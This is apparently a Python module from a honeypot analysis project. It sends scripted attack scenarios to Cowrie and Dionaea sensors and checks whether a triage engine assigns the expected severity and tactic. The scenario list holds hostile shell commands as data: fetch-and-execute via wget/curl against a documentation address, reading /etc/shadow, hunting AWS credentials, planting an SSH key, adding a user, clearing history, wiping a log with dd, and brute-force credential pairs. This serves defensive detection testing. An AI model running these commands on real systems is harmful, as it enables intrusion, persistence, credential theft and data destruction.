"""La campaña de validación: sesiones controladas contra los sensores, con la clasificación esperada
fijada antes de correr.

El motor se mide en producción contra la revisión a ciegas del analista, pero ahí la verdad de
referencia es un juicio humano sobre tráfico real. La campaña agrega la otra mitad: conductas cuya
clasificación se conoce de antemano, porque las elige quien corre la prueba. Cada escenario declara
el sensor, lo que se envía, la severidad esperada con las dos referencias (la escala del proyecto y
el criterio de impacto del analista) y la táctica esperada con su motivo cuando es nula.

Que los escenarios estén en el código y entren al repositorio antes de la primera corrida es la
constancia de que se fijaron antes de ver el resultado. La comparación (`--comparar`) lee después
las decisiones de origen interno dentro de la ventana de la corrida y las enfrenta con lo esperado.

Tres restricciones del entorno moldean los escenarios, y ninguna es un defecto a corregir:

- Al motor solo llegan los eventos que publica el bus: autenticaciones exitosas, cualquier
  autenticación contra el sensor de servicios de red, comandos y archivos. Un intento fallido por
  SSH se indexa pero no se tría, así que un escenario de fuerza bruta se arma contra el sensor de
  servicios de red, que sí publica los intentos.
- Los sensores no tienen salida a internet. Una descarga apunta a una dirección de documentación
  (no sale del servidor, y aunque saliera no llegaría a nadie) y el sensor la registra igual: el
  comando como proceso y la descarga que no se concreta como archivo.
- El sensor de acceso remoto no ejecuta de verdad lo que recibe. Se mide cómo se clasifica lo que
  el atacante escribe, no el efecto del comando.

Se corre en el servidor con `make campana`. Con `--seco` imprime los escenarios y lo esperado sin
tocar la red; con `--comparar` lee las decisiones de la última corrida y arma la comparación.
"""

from __future__ import annotations

import argparse
import ftplib
import json
import re
import sys
import urllib.request
from dataclasses import dataclass
from datetime import UTC, datetime
from pathlib import Path
from typing import Any

from .. import redes
from ..api import queries
from ..api.decisiones import DECISIONES

# Adónde apuntan las descargas de prueba: un rango reservado para documentación. No resuelve a
# ningún equipo y el sensor no tiene salida igual, así que nada viaja a ningún lado.
DESTINO = "198.51.100.20"

# Dónde queda el registro de una corrida, para que la comparación sepa qué se envió y cuándo.
CORRIDA_FILE = Path("data/processed/campana.json")

# El indicador del intérprete del sensor: `#` para root y `$` para el resto. Esperar solo uno hace
# que cada comando de root agote el plazo entero antes de mandar el siguiente.
INDICADOR = [re.compile(rb"[#$] $")]

# Cómo cierra el ejecutor cada sesión. El sensor lo registra como un comando más, pero lo escribe la
# campaña y no el escenario, así que la comparación lo cuenta aparte.
CIERRE = "exit"

# Los dos sensores, por el nombre con el que el pipeline los etiqueta.
COWRIE = "cowrie"
DIONAEA = "dionaea"


@dataclass(frozen=True)
class Escenario:
    """Una conducta a enviar, con lo que el motor debería contestar.

    `comandos` son las líneas que se escriben en la sesión del sensor de acceso remoto. Para el
    sensor de servicios de red, `credenciales` son los pares usuario y clave de los intentos de
    autenticación. Un escenario usa uno de los dos, según el sensor.
    """

    nombre: str
    sensor: str
    tecnica: str
    severidad_escala: str
    severidad_impacto: str
    tactica: str | None
    motivo: str | None = None
    comandos: tuple[str, ...] = ()
    credenciales: tuple[tuple[str, str], ...] = ()


# Los escenarios, con la clasificación esperada. Los comandos son representativos de la técnica de
# Atomic Red Team que nombra cada uno, adaptados a Linux y al intérprete del sensor. La severidad de
# la escala es crítica cuando el comando transfiere un archivo (regla del proyecto); la de impacto
# es la del criterio del analista, que reserva crítico para un alcance extremo. La táctica sigue la
# regla por objetivo, con su motivo cuando ninguna aplica.
ESCENARIOS: tuple[Escenario, ...] = (
    Escenario(
        nombre="Fuerza bruta de credenciales",
        sensor=DIONAEA,
        tecnica="T1110",
        severidad_escala="bajo",
        severidad_impacto="bajo",
        tactica="Acceso a credenciales",
        credenciales=(
            ("admin", "admin"),
            ("admin", "123456"),
            ("root", "toor"),
            ("oracle", "oracle"),
            ("postgres", "postgres"),
            ("sa", "sa"),
        ),
    ),
    Escenario(
        nombre="Información del sistema operativo",
        sensor=COWRIE,
        tecnica="T1082",
        severidad_escala="alto",
        severidad_impacto="alto",
        tactica="Descubrimiento",
        comandos=("uname -a", "hostname", "cat /etc/os-release"),
    ),
    Escenario(
        nombre="Dueño y usuario del sistema",
        sensor=COWRIE,
        tecnica="T1033",
        severidad_escala="alto",
        severidad_impacto="alto",
        tactica="Descubrimiento",
        comandos=("whoami", "id", "who"),
    ),
    Escenario(
        nombre="Configuración de red",
        sensor=COWRIE,
        tecnica="T1016",
        severidad_escala="alto",
        severidad_impacto="alto",
        tactica="Descubrimiento",
        comandos=("ip addr", "arp -a"),
    ),
    Escenario(
        nombre="Procesos en ejecución",
        sensor=COWRIE,
        tecnica="T1057",
        severidad_escala="alto",
        severidad_impacto="alto",
        tactica="Descubrimiento",
        comandos=("ps aux",),
    ),
    Escenario(
        nombre="Clave SSH autorizada",
        sensor=COWRIE,
        tecnica="T1098.004",
        severidad_escala="alto",
        severidad_impacto="alto",
        tactica="Persistencia",
        comandos=('echo "ssh-ed25519 AAAAC3Nz clave-de-prueba" >> ~/.ssh/authorized_keys',),
    ),
    Escenario(
        nombre="Alta de usuario",
        sensor=COWRIE,
        tecnica="T1136.001",
        severidad_escala="alto",
        severidad_impacto="alto",
        tactica="Persistencia",
        comandos=("useradd -M -N -r -s /bin/bash cuenta_de_prueba",),
    ),
    Escenario(
        nombre="Tarea programada en cron",
        sensor=COWRIE,
        tecnica="T1053.003",
        severidad_escala="alto",
        severidad_impacto="alto",
        tactica="Persistencia",
        comandos=('echo "* * * * * id" > /tmp/prueba_cron && crontab /tmp/prueba_cron',),
    ),
    Escenario(
        nombre="Borrado del historial",
        sensor=COWRIE,
        tecnica="T1070.003",
        severidad_escala="alto",
        severidad_impacto="alto",
        tactica="Evasión de defensas",
        comandos=("cat /dev/null > ~/.bash_history", "history -c"),
    ),
    Escenario(
        nombre="Lectura de credenciales del sistema",
        sensor=COWRIE,
        tecnica="T1003.008",
        severidad_escala="alto",
        severidad_impacto="alto",
        tactica="Acceso a credenciales",
        comandos=("cat /etc/shadow", "cat /etc/passwd"),
    ),
    Escenario(
        nombre="Búsqueda de credenciales en archivos",
        sensor=COWRIE,
        tecnica="T1552.001",
        severidad_escala="alto",
        severidad_impacto="alto",
        tactica="Acceso a credenciales",
        comandos=("find / -name '*.aws/credentials' -type f 2>/dev/null",),
    ),
    Escenario(
        nombre="Script escrito y ejecutado en la sesión",
        sensor=COWRIE,
        tecnica="T1059.004",
        severidad_escala="alto",
        severidad_impacto="alto",
        tactica="Ejecución",
        comandos=("echo 'id' > /tmp/prueba.sh && chmod +x /tmp/prueba.sh && sh /tmp/prueba.sh",),
    ),
    Escenario(
        nombre="Descarga sin ejecución",
        sensor=COWRIE,
        tecnica="T1105",
        severidad_escala="critico",
        severidad_impacto="alto",
        tactica=None,
        motivo="fuera_del_catalogo",
        comandos=(f"wget http://{DESTINO}/a", f"curl -O http://{DESTINO}/a"),
    ),
    Escenario(
        nombre="Descarga y ejecución encadenadas",
        sensor=COWRIE,
        tecnica="T1105",
        severidad_escala="critico",
        severidad_impacto="alto",
        tactica="Ejecución",
        comandos=(f"wget http://{DESTINO}/a -O /tmp/a && chmod +x /tmp/a && /tmp/a",),
    ),
    Escenario(
        nombre="Binario escrito de a trozos",
        sensor=COWRIE,
        tecnica="T1105",
        severidad_escala="critico",
        severidad_impacto="alto",
        tactica="Ejecución",
        comandos=(
            r"echo -ne '\x7f\x45\x4c\x46\x02\x01\x01' > /tmp/b && chmod +x /tmp/b && /tmp/b",
        ),
    ),
    Escenario(
        nombre="Destrucción de datos",
        sensor=COWRIE,
        tecnica="T1485",
        severidad_escala="alto",
        severidad_impacto="critico",
        tactica=None,
        motivo="fuera_del_catalogo",
        comandos=("dd if=/dev/zero of=/var/log/syslog bs=1M count=1",),
    ),
    Escenario(
        nombre="Trampa: nombra la herramienta sin descargar",
        sensor=COWRIE,
        tecnica="-",
        severidad_escala="alto",
        severidad_impacto="alto",
        tactica="Descubrimiento",
        comandos=("wget --version", "which curl", "curl --help"),
    ),
    Escenario(
        nombre="Acción sin objetivo táctico",
        sensor=COWRIE,
        tecnica="-",
        severidad_escala="alto",
        severidad_impacto="alto",
        tactica=None,
        motivo="sin_objetivo_tactico",
        comandos=("echo ok", "cd /tmp"),
    ),
)


def esperado_por_comando() -> dict[str, Escenario]:
    """Cada comando de los escenarios de acceso remoto, apuntando a su escenario.

    La clave es el comando tal como se envía. La comparación empareja por acá, porque el documento
    de la decisión guarda el comando y es lo que no se repite entre escenarios distintos.
    """
    return {c: e for e in ESCENARIOS if e.sensor == COWRIE for c in e.comandos}


# La ejecución contra los sensores


def _sesion_cowrie(
    host: str, puerto: int, usuario: str, clave: str, comandos: tuple[str, ...], espera: float
) -> bool:
    """Abre una sesión por telnet, ingresa y escribe cada comando. No lee el resultado: lo que
    importa es lo que el sensor registra, que el motor va a leer del índice.

    Devuelve si el sensor contestó. Uno trabado acepta la conexión (la toma el proxy de Docker) pero
    nunca muestra el ingreso, y sin esta respuesta la corrida seguiría como si nada.
    """
    # Importado acá y no arriba: queda fuera de la corrida en seco y de la comparación, que no
    # tocan la red, así que su aviso de obsolescencia no aparece cuando no se usa.
    import telnetlib

    tn = telnetlib.Telnet(host, puerto, timeout=espera)
    try:
        if b"login:" not in tn.read_until(b"login:", timeout=espera):
            return False
        tn.write(usuario.encode() + b"\n")
        tn.read_until(b"assword:", timeout=espera)
        tn.write(clave.encode() + b"\n")
        tn.expect(INDICADOR, timeout=espera)
        for comando in comandos:
            tn.write(comando.encode() + b"\n")
            tn.expect(INDICADOR, timeout=espera)
        tn.write(CIERRE.encode() + b"\n")
        return True
    finally:
        tn.close()


def _fuerza_bruta_ftp(
    host: str, puerto: int, credenciales: tuple[tuple[str, str], ...], espera: float
) -> None:
    """Un intento de ingreso por FTP por cada par. El sensor de servicios de red publica los
    intentos aunque no prosperen, así que cada uno es una autenticación para el motor."""
    for usuario, clave in credenciales:
        ftp = ftplib.FTP()
        try:
            ftp.connect(host, puerto, timeout=espera)
            try:
                ftp.login(usuario, clave)
            except ftplib.error_perm:
                pass
        except (OSError, ftplib.Error):
            pass
        finally:
            try:
                ftp.quit()
            except (OSError, ftplib.Error):
                ftp.close()


def correr(host: str, usuario: str, clave: str, espera: float = 10.0) -> dict[str, Any]:
    """Corre todos los escenarios contra el host y devuelve el registro de la corrida.

    El registro dice qué se envió y entre qué marcas temporales, que es lo que la comparación
    necesita para acotar la ventana y emparejar cada comando con su escenario.
    """
    desde = datetime.now(UTC).isoformat(timespec="seconds")
    sin_respuesta: list[str] = []
    for e in ESCENARIOS:
        if e.sensor == COWRIE:
            if not _sesion_cowrie(host, 23, usuario, clave, e.comandos, espera):
                sin_respuesta.append(e.nombre)
        else:
            _fuerza_bruta_ftp(host, 21, e.credenciales, espera)
    hasta = datetime.now(UTC).isoformat(timespec="seconds")
    return {
        "desde": desde,
        "hasta": hasta,
        "host": host,
        "sin_respuesta": sin_respuesta,
        "escenarios": [
            {
                "nombre": e.nombre,
                "tecnica": e.tecnica,
                "sensor": e.sensor,
                "severidad_escala": e.severidad_escala,
                "severidad_impacto": e.severidad_impacto,
                "tactica": e.tactica,
                "motivo": e.motivo,
                "comandos": list(e.comandos),
                "credenciales": [u for u, _ in e.credenciales],
            }
            for e in ESCENARIOS
        ],
    }


# La comparación entre lo obtenido y lo esperado


def _consulta_de_la_corrida(desde: str, hasta: str) -> dict[str, Any]:
    """Las decisiones de origen interno sobre eventos ocurridos dentro de la ventana de la corrida.

    La ventana se aplica a `evento.momento` y no a `@timestamp`, que es cuándo se decidió: el motor
    tría después de que el evento cruza el pipeline, así que una decisión puede llegar minutos más
    tarde que el fin de la corrida y con `@timestamp` quedaría afuera.

    El origen interno es el que `redes` ya excluye de las cifras educativas: la campaña corre desde
    el servidor, así que su tráfico entra por una red privada y no se mezcla con los atacantes.
    """
    return {
        "size": 1000,
        "query": {
            "bool": {
                "filter": [{"range": {"evento.momento": {"gte": desde, "lte": hasta}}}],
                "should": [{"term": {"evento.origen": r}} for r in redes.INTERNAS],
                "minimum_should_match": 1,
            }
        },
    }


def _decisiones_internas(desde: str, hasta: str, es_url: str) -> list[dict[str, Any]]:
    consulta = _consulta_de_la_corrida(desde, hasta)
    pedido = urllib.request.Request(
        f"{es_url}/{DECISIONES}/_search",
        data=json.dumps(consulta).encode(),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with urllib.request.urlopen(pedido, timeout=60) as resp:
        return [h["_source"] for h in json.load(resp)["hits"]["hits"]]


def _comandos_de_telemetria(doc_ids: list[str], es_url: str) -> dict[str, str]:
    """El comando de cada evento, buscado por identificador en el índice de telemetría.

    La decisión guarda un resumen recortado, no el comando entero, así que para emparejar con los
    escenarios hace falta leer `process.command_line` del evento, bajo el mismo identificador.
    """
    if not doc_ids:
        return {}
    r = queries._search(
        {
            "size": len(doc_ids),
            "query": {"ids": {"values": doc_ids}},
            "_source": ["process.command_line"],
        },
        es_url,
    )
    comandos: dict[str, str] = {}
    for h in r["hits"]["hits"]:
        fuente = h["_source"]
        proceso = fuente.get("process") or {}
        comando = proceso.get("command_line") or fuente.get("process.command_line")
        if comando:
            comandos[h["_id"]] = comando
    return comandos


def _matriz(pares: list[tuple[str | None, str | None]]) -> dict[str, dict[str, int]]:
    """Cuenta los pares (esperado, obtenido) como una tabla anidada."""
    tabla: dict[str, dict[str, int]] = {}
    for esperado, obtenido in pares:
        fila = tabla.setdefault(str(esperado), {})
        fila[str(obtenido)] = fila.get(str(obtenido), 0) + 1
    return tabla


def comparar(
    corrida: dict[str, Any], decisiones: list[dict[str, Any]], comandos: dict[str, str]
) -> dict[str, Any]:
    """Enfrenta las decisiones de la corrida con lo esperado, por comando.

    `comandos` mapea el identificador del evento a su comando, leído de la telemetría. Los
    escenarios de acceso remoto se emparejan por ese comando, que no se repite entre escenarios.
    Las autenticaciones se cuentan aparte: todos los intentos comparten la clase.
    """
    por_comando = esperado_por_comando()
    sev_escala: list[tuple[str | None, str | None]] = []
    sev_impacto: list[tuple[str | None, str | None]] = []
    tactica: list[tuple[str | None, str | None]] = []
    sin_emparejar = 0
    cierres = 0
    emparejadas = 0
    copiadas = 0

    for d in decisiones:
        evento = d.get("evento", {})
        decision = d.get("decision", {})
        comando = comandos.get(evento.get("doc_id") or "", "")
        escenario = por_comando.get(comando)
        if escenario is None:
            if comando == CIERRE:
                cierres += 1
            elif evento.get("categoria") == "process":
                sin_emparejar += 1
            continue
        emparejadas += 1
        if d.get("ciclo", {}).get("reutilizada_de"):
            copiadas += 1
        obtenida = decision.get("severidad")
        sev_escala.append((escenario.severidad_escala, obtenida))
        sev_impacto.append((escenario.severidad_impacto, obtenida))
        tactica.append((escenario.tactica, decision.get("tactica_mitre")))

    # Las descargas no llegan como comando sino como evento de archivo: el sensor registra el
    # intento aunque no se concrete. Para la escala del proyecto, un archivo tiene piso crítico, así
    # que acá se mide si el motor sostiene ese nivel en el camino que de verdad lo produce.
    archivos = [d for d in decisiones if d.get("evento", {}).get("categoria") == "file"]
    por_categoria: dict[str, int] = {}
    for d in decisiones:
        cat = d.get("evento", {}).get("categoria") or "sin categoría"
        por_categoria[cat] = por_categoria.get(cat, 0) + 1

    autenticaciones = [
        d for d in decisiones if d.get("evento", {}).get("categoria") == "authentication"
    ]
    return {
        "ventana": {"desde": corrida["desde"], "hasta": corrida["hasta"]},
        "decisiones": len(decisiones),
        "por_categoria": por_categoria,
        "emparejadas": emparejadas,
        "sin_emparejar": sin_emparejar,
        "cierres": cierres,
        "copiadas": copiadas,
        "autenticaciones": len(autenticaciones),
        "severidad_escala": _matriz(sev_escala),
        "severidad_impacto": _matriz(sev_impacto),
        "tactica": _matriz(tactica),
        "archivos_por_severidad": _conteo(
            [d.get("decision", {}).get("severidad") for d in archivos]
        ),
    }


def _conteo(valores: list[str | None]) -> dict[str, int]:
    conteo: dict[str, int] = {}
    for v in valores:
        conteo[str(v)] = conteo.get(str(v), 0) + 1
    return conteo


def _aciertos(matriz: dict[str, dict[str, int]]) -> tuple[int, int]:
    total = sum(sum(fila.values()) for fila in matriz.values())
    aciertos = sum(fila.get(clave, 0) for clave, fila in matriz.items())
    return aciertos, total


def informe_corrida() -> list[str]:
    """Los escenarios y lo esperado, para la corrida en seco."""
    lineas = [f"{len(ESCENARIOS)} escenarios; la descarga apunta a {DESTINO} (documentación)."]
    for e in ESCENARIOS:
        tac = e.tactica or f"(sin táctica: {e.motivo})"
        que = e.comandos or tuple(f"intento con {u}" for u, _ in e.credenciales)
        lineas.append(
            f"  {e.tecnica:<10} {e.sensor:<8} escala={e.severidad_escala:<8} "
            f"impacto={e.severidad_impacto:<8} {tac}"
        )
        for c in que:
            lineas.append(f"      {c}")
    return lineas


def informe_comparacion(r: dict[str, Any]) -> list[str]:
    v = r["ventana"]
    categorias = ", ".join(f"{c} {n}" for c, n in sorted(r["por_categoria"].items()))
    lineas = [
        f"Corrida {v['desde']} a {v['hasta']}: {r['decisiones']} decisiones de origen interno.",
        f"Por categoría: {categorias}.",
        f"Comandos emparejados {r['emparejadas']}, sin emparejar {r['sin_emparejar']}, "
        f"cierres de sesión {r.get('cierres', 0)}, copiadas {r['copiadas']}; "
        f"autenticaciones {r['autenticaciones']}.",
    ]
    for titulo, clave in (
        ("Severidad, escala del proyecto", "severidad_escala"),
        ("Severidad, criterio de impacto", "severidad_impacto"),
        ("Táctica", "tactica"),
    ):
        aciertos, total = _aciertos(r[clave])
        lineas.append(f"\n{titulo}: {aciertos} de {total}")
        for esperado, fila in sorted(r[clave].items()):
            for obtenido, n in sorted(fila.items()):
                marca = " " if esperado == obtenido else "x"
                lineas.append(f"  {marca} esperado {esperado:<24} obtenido {obtenido:<24} {n}")
    archivos = r["archivos_por_severidad"]
    if archivos:
        total = sum(archivos.values())
        criticos = archivos.get("critico", 0)
        lineas.append(f"\nEventos de archivo (descargados o escritos en la sesión): {total}")
        lineas.append(f"  en crítico {criticos} de {total} (piso del evento de archivo)")
        for sev, n in sorted(archivos.items()):
            if sev != "critico":
                lineas.append(f"  x en {sev} {n}")
    return lineas


def main() -> int:
    ap = argparse.ArgumentParser(
        description="Campaña de validación adversaria contra los sensores."
    )
    ap.add_argument("--seco", action="store_true", help="imprime los escenarios y no toca la red")
    ap.add_argument("--comparar", action="store_true", help="compara la última corrida guardada")
    ap.add_argument("--host", default="127.0.0.1", help="dónde escuchan los sensores")
    ap.add_argument("--usuario", default="root", help="usuario para la sesión del acceso remoto")
    ap.add_argument("--clave", default="123456", help="clave para la sesión del acceso remoto")
    args = ap.parse_args()

    if args.seco:
        print("\n".join(informe_corrida()))
        return 0

    if args.comparar:
        corrida = json.loads(CORRIDA_FILE.read_text(encoding="utf-8"))
        decisiones = _decisiones_internas(corrida["desde"], corrida["hasta"], queries.ES_URL)
        doc_ids = [d.get("evento", {}).get("doc_id", "") for d in decisiones]
        comandos = _comandos_de_telemetria([i for i in doc_ids if i], queries.ES_URL)
        print("\n".join(informe_comparacion(comparar(corrida, decisiones, comandos))))
        return 0

    corrida = correr(args.host, args.usuario, args.clave)
    CORRIDA_FILE.write_text(json.dumps(corrida, ensure_ascii=False, indent=2), encoding="utf-8")
    print(f"Corrida guardada en {CORRIDA_FILE}: {corrida['desde']} a {corrida['hasta']}.")
    if corrida["sin_respuesta"]:
        print(f"El sensor no contestó en {len(corrida['sin_respuesta'])} escenarios:")
        for nombre in corrida["sin_respuesta"]:
            print(f"  {nombre}")
        return 1
    print("Esperá a que el motor consuma el bus y después corré con --comparar.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
